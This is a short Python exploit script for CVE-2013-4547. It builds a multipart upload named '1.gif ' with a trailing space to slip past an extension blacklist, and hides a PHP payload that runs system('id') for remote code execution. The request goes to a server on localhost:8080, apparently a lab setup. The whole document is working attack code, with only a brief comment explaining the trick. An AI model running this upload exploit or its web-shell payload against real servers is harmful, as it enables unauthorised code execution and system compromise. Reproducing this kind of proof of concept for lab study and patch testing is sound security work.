import http.client

# The whole point of CVE-2013-4547: upload a file whose name ends with a space.
# PHP's pathinfo() sees the extension as "gif " (with the space) -> not blacklisted.
filename = "1.gif "  # <-- trailing space
php_code = b'<?php echo "CVE-2013-4547 RCE SUCCESS!"; system("id"); ?>'

boundary = "----WebKitFormBoundaryCVE20134547"
body = (
    b"--" + boundary.encode() + b"\r\n"
    + b'Content-Disposition: form-data; name="file_upload"; filename="1.gif "\r\n'
    + b"Content-Type: image/gif\r\n\r\n"
    + php_code + b"\r\n"
    + b"--" + boundary.encode() + b"--\r\n"
)

conn = http.client.HTTPConnection("localhost", 8080)
conn.request(
    "POST",
    "/",
    body=body,
    headers={
        "Content-Type": "multipart/form-data; boundary=" + boundary,
        "Content-Length": str(len(body)),
    },
)
resp = conn.getresponse()
print("HTTP", resp.status)
print(resp.read().decode(errors="replace"))
